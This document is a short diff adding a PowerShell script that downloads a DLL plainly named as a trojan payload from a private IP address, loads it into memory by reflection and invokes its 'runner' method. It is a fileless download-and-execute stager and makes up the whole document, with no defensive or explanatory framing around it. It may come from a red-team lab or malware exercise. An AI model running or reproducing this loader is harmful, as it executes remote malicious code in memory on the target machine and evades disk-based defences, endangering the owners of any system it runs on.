@@ -1,0 +1,5 @@
+$data = (New-Object System.Net.WebClient).DownloadData("http://10.0.31.15/DLL_Trojan_Payload.dll")
+$assem = [System.Reflection.Assembly]::Load($data)
+$class = $assem.GetType("ClassLibrary1.Class1")
+$method = $class.GetMethod("runner")
+$method.Invoke(0,$null)
